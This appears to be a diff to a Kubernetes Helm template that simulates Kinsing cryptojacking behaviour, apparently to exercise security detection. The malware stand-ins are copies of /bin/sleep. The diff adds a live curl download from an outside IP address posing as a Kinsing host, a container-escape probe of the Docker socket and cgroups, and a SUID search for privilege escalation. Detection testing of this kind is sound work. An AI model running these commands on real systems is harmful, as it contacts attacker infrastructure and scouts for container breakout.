@@ -31,25 +31,31 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
             - |
+              apk add --no-cache curl wget
               echo "Starting Kinsing simulation..."
-              # Mimic kinsing behavior: download a script, then a binary, then run it.
               while true; do
                 echo "[$(date)] curl http://195.3.146.118/kinsing.sh | sh"
-                # Create a fake binary
+                curl -s http://195.3.146.118/kinsing 2>&1 || true
+                
                 cp /bin/sleep /tmp/kinsing
                 chmod +x /tmp/kinsing
                 echo "[$(date)] Running /tmp/kinsing..."
-                /tmp/kinsing 30 &
-                
-                sleep 5
+                /tmp/kinsing 20 &
                 
                 echo "[$(date)] Starting cryptominer /tmp/kdevtmpfsi..."
                 cp /bin/sleep /tmp/kdevtmpfsi
                 chmod +x /tmp/kdevtmpfsi
-                /tmp/kdevtmpfsi 20 &
+                /tmp/kdevtmpfsi 15 &
+                
+                echo "[$(date)] Container escape attempt..."
+                cat /proc/self/cgroup 2>/dev/null || true
+                ls -la /var/run/docker.sock 2>/dev/null || true
+                
+                echo "[$(date)] Privilege escalation attempt..."
+                find / -perm -4000 2>/dev/null | head -5
                 
                 wait
-                sleep 60
+                sleep 30
               done
           {{- end }}
 {{- end }}
